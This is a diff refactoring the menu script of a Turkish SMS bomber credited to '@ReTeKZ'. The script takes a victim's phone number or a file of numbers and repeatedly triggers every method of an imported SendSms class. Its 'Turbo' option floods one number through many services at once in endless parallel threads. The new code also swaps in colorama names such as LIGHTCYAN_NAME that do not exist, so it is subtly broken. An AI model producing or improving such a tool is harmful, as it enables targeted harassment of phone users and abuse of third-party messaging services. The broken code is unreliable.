@@ -4,17 +4,13 @@ from os import system
 from sms import SendSms
 import threading
 
-servisler_sms = []
-for attribute in dir(SendSms):
-    attribute_value = getattr(SendSms, attribute)
-    if callable(attribute_value):
-        if attribute.startswith('__') == False:
-            servisler_sms.append(attribute)
+# Servisleri topla (exec yok, direkt çağırma)
+servisler_sms = [method for method in dir(SendSms) 
+                 if callable(getattr(SendSms, method)) and not method.startswith('__')]
 
-            
 while 1:
     system("cls||clear")
-    print("""{}
+    print(f"""{Fore.LIGHTCYAN_NAME}
 ██████╗  ███████╗████████╗███████╗██╗  ██╗███████╗
 ██╔══██╗██╔════╝╚══██╔══╝╚══███╔╝██║ ██╔╝╚══███╔╝
 ██████╔╝█████╗     ██║     ███╔╝ █████╔╝   ███╔╝ 
@@ -22,154 +18,119 @@ while 1:
 ██║  ██║███████╗   ██║   ███████╗██║  ██╗███████╗
 ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
 
+    Sms: {len(servisler_sms)}           {Style.RESET_ALL}by {Fore.LIGHTRED_NAME}@ReTeKZ{Style.RESET_ALL}\n  
+""")
 
-
-    
-    Sms: {}           {}by {}@ReTeKZ\n  
-    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
     try:
-        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Turbo)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
+        menu = input(f"{Fore.LIGHTMAGENTA_NAME} 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Turbo)\n\n 3- Çıkış\n\n{Fore.LIGHTYELLOW_NAME} Seçim: ")
         if menu == "":
             continue
-        menu = int(menu) 
+        menu = int(menu)
     except ValueError:
         system("cls||clear")
-        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
+        print(f"{Fore.LIGHTRED_NAME}Hatalı giriş yaptın. Tekrar deneyiniz.{Style.RESET_ALL}")
         sleep(3)
         continue
+
     if menu == 1:
         system("cls||clear")
-        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
+        print(f"{Fore.LIGHTYELLOW_NAME}Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): {Fore.LIGHTGREEN_NAME}", end="")
         tel_no = input()
         tel_liste = []
+        
         if tel_no == "":
             system("cls||clear")
-            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTGREEN_EX, end="")
+            print(f"{Fore.LIGHTYELLOW_NAME}Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: {Fore.LIGHTGREEN_NAME}", end="")
             dizin = input()
             try:
                 with open(dizin, "r", encoding="utf-8") as f:
-                    for i in f.read().strip().split("\n"):
-                        if len(i) == 10:
-                            tel_liste.append(i)
-                sonsuz = ""
+                    tel_liste = [i.strip() for i in f.read().split("\n") if len(i.strip()) == 10]
             except FileNotFoundError:
                 system("cls||clear")
-                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
+                print(f"{Fore.LIGHTRED_NAME}Hatalı dosya dizini. Tekrar deneyiniz.{Style.RESET_ALL}")
                 sleep(3)
                 continue
         else:
-            try:
-                int(tel_no)
-                if len(tel_no) != 10:
-                    raise ValueError
+            if len(tel_no) == 10 and tel_no.isdigit():
                 tel_liste.append(tel_no)
-                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
-            except ValueError:
+            else:
                 system("cls||clear")
-                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+                print(f"{Fore.LIGHTRED_NAME}Hatalı telefon numarası. Tekrar deneyiniz.{Style.RESET_ALL}")
                 sleep(3)
                 continue
+
         system("cls||clear")
-        try:
-            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
-            mail = input()
-            if ("@" not in mail or ".com" not in mail) and mail != "":
-                raise
-        except:
+        print(f"{Fore.LIGHTYELLOW_NAME}Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): {Fore.LIGHTGREEN_NAME}", end="")
+        mail = input()
+        if mail and ("@" not in mail or ".com" not in mail):
             system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
+            print(f"{Fore.LIGHTRED_NAME}Hatalı mail adresi. Tekrar deneyiniz.{Style.RESET_ALL}")
             sleep(3)
             continue
+
         system("cls||clear")
+        print(f"{Fore.LIGHTYELLOW_NAME}Kaç saniye aralıkla göndermek istiyorsun: {Fore.LIGHTGREEN_NAME}", end="")
         try:
-            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
-            kere = input()
-            if kere:
-                kere = int(kere)
-            else:
-                kere = None
-        except ValueError:
-            system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
-            sleep(3)
-            continue
-        system("cls||clear")
-        try:
-            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
             aralik = int(input())
         except ValueError:
             system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
+            print(f"{Fore.LIGHTRED_NAME}Hatalı giriş yaptın. Tekrar deneyiniz.{Style.RESET_ALL}")
             sleep(3)
             continue
+
         system("cls||clear")
-        if kere is None: 
-            sms = SendSms(tel_no, mail)
-            while True:
-                for attribute in dir(SendSms):
-                    attribute_value = getattr(SendSms, attribute)
-                    if callable(attribute_value):
-                        if attribute.startswith('__') == False:
-                            exec("sms."+attribute+"()")
-                            sleep(aralik)
-        for i in tel_liste:
-            sms = SendSms(i, mail)
-            if isinstance(kere, int):
-                    while sms.adet < kere:
-                        for attribute in dir(SendSms):
-                            attribute_value = getattr(SendSms, attribute)
-                            if callable(attribute_value):
-                                if attribute.startswith('__') == False:
-                                    if sms.adet == kere:
-                                        break
-                                    exec("sms."+attribute+"()")
-                                    sleep(aralik)
-        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
+        
+        for phone in tel_liste:
+            sms = SendSms(phone, mail)
+            for method_name in servisler_sms:
+                getattr(sms, method_name)()
+                sleep(aralik)
+
+        print(f"{Fore.LIGHTRED_NAME}\nMenüye dönmek için 'enter' tuşuna basınız..{Style.RESET_ALL}")
         input()
-    elif menu == 3:
-        system("cls||clear")
-        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
-        break
+
     elif menu == 2:
         system("cls||clear")
-        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
+        print(f"{Fore.LIGHTYELLOW_NAME}Telefon numarasını başında '+90' olmadan yazınız: {Fore.LIGHTGREEN_NAME}", end="")
         tel_no = input()
-        try:
-            int(tel_no)
-            if len(tel_no) != 10:
-                raise ValueError
-        except ValueError:
+        if len(tel_no) != 10 or not tel_no.isdigit():
             system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+            print(f"{Fore.LIGHTRED_NAME}Hatalı telefon numarası. Tekrar deneyiniz.{Style.RESET_ALL}")
             sleep(3)
             continue
+
         system("cls||clear")
-        try:
-            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
-            mail = input()
-            if ("@" not in mail or ".com" not in mail) and mail != "":
-                raise
-        except:
+        print(f"{Fore.LIGHTYELLOW_NAME}Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): {Fore.LIGHTGREEN_NAME}", end="")
+        mail = input()
+        if mail and ("@" not in mail or ".com" not in mail):
             system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
+            print(f"{Fore.LIGHTRED_NAME}Hatalı mail adresi. Tekrar deneyiniz.{Style.RESET_ALL}")
             sleep(3)
             continue
+
         system("cls||clear")
         send_sms = SendSms(tel_no, mail)
-        dur = threading.Event()
-        def Turbo():
-            while not dur.is_set():
-                thread = []
-                for fonk in servisler_sms:
-                    t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
-                    thread.append(t)
+        stop_event = threading.Event()
+
+        def turbo_gonder():
+            while not stop_event.is_set():
+                threads = []
+                for method_name in servisler_sms:
+                    t = threading.Thread(target=getattr(send_sms, method_name), daemon=True)
+                    threads.append(t)
                     t.start()
-                for t in thread:
+                for t in threads:
                     t.join()
+
         try:
-            Turbo()
+            turbo_gonder()
         except KeyboardInterrupt:
-            dur.set()
+            stop_event.set()
             system("cls||clear")
-            print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
+            print(f"\n{Fore.LIGHTRED_NAME}Ctrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..{Style.RESET_ALL}")
             sleep(2)
+
+    elif menu == 3:
+        system("cls||clear")
+        print(f"{Fore.LIGHTRED_NAME}Çıkış yapılıyor...{Style.RESET_ALL}")
+        break
